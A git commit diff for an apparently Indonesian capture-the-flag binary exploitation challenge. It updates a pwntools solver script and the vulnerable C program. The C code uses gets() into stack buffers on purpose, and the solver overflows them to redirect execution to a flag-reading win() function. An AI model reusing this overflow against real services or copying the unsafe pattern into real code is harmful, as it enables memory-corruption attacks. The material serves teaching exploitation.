00a5951efaf8e7612a13a786f5dff36f375d3dcd
Fakhry224 <fakhryzahranhakim@gmail.com>
2024-11-14 04:01:36 +0700

    Fix: chall

--- pwn-pak-vincent2/solver.py
+++ pwn-pak-vincent2/solver.py
@@ -1,29 +1,26 @@
 from pwn import *
 
-exe = './vuln'
+exe = './chall'
 elf = context.binary = ELF(exe, checksec=False)
 context.log_level = 'debug'
 
-# p = process(exe)
-p = remote('103.127.137.156', 1212)
+p = process(exe)
+#p = remote('103.127.137.156', 1212)
+#p = remote('192.168.64.1', 1212)
 
-win_addr = p.recvline_contains(b"win addr").strip().split(b"0x")[-1]
-win_addr = int(win_addr, 16)
+win_addr = elf.symbols['win']
 
-print(f"Win function address: {hex(win_addr)}")
-
-offset = 32
+offset = 64
 key1 = b'codex'
 key2 = b'candidateOfaWinner'
 
-payload1 = b'\x00'*(offset - 1)
+payload1 = b'\x00'*((offset//2) - 1)
 payload2 = key2 + b'\x00' * (offset - len(key2)) + key1
 
 p.sendlineafter(b"? ",  payload1)
 p.sendlineafter(b"? ", payload2)
 
 offset = 64 + 8
-
 
 payload = flat(
         b'A'*offset,
--- pwn-pak-vincent2/src/chall.c
+++ pwn-pak-vincent2/src/chall.c
@@ -4,11 +4,13 @@
 #include <sys/types.h>
 
 void setup() {
-  setvbuf(stdin, NULL, _IONBF, 0);
-  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 1, 0LL);
 
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
+
+  fflush(stdout);
 }
 
 void teleport();
@@ -17,16 +19,14 @@ void win();
 int main() {
   setup();
 
-  printf("Ini apa ya ....(win addr): %p\n", (void*)win);
-
   char key1[32];
-  char key2[32];
+  char key2[64];
 
   printf("Pak Vincent, nih ada hadiah buat Bapak\n");
   printf("Tapi sebutin dulu kunci ke-1 nya apa? ");
   gets(key1);
 
-  if(strcmp(key1, "codex") == 0) {
+  if(strcmp(key1, "cosmos") == 0) {
     printf("Jangan curang pak :P\n");
     return  0;
   }
@@ -34,7 +34,7 @@ int main() {
   printf("Sekarang kunci ke-2 nya apa? ");
   gets(key2);
 
-  if(strcmp(key1, "codex") == 0 && strcmp(key2, "candidateOfaWinner") == 0){
+  if(strcmp(key1, "cosmos") == 0 && strcmp(key2, "candidateOfaWinner") == 0){
     printf("WOW... Pak Vincent berhasil menjawab kedua kuncinya!\n");
     teleport();
 
@@ -55,8 +55,28 @@ void teleport() {
   gets(buffer);
 }
 
+void read_flag() {
+  char flag[64];
+  
+  FILE *file = fopen("flag.txt", "r");
+  if (file == NULL) {
+    printf("flag.txt is missing! please create file flag.txt first\n");
+
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+  printf("Flag: %s\n", flag);
+
+  fclose(file);
+
+  exit(0);
+}
+
 void win() {
-  printf("Yeay, Selamat Pak Vincent berhasil mendapatkan flag :D, ini flag buat Pak Vincent: CODEX2K24{s3ru_k4n_b1n4ry_3xpl0it4tion_s3m4ng4t_s3m0ga_ju4ra!!}\n");
+  printf("Yeay, Selamat Pak Vincent berhasil mendapatkan flag :D, ini flag buat Pak Vincent:\n");
+
+  read_flag();
 
   return 0;
 }
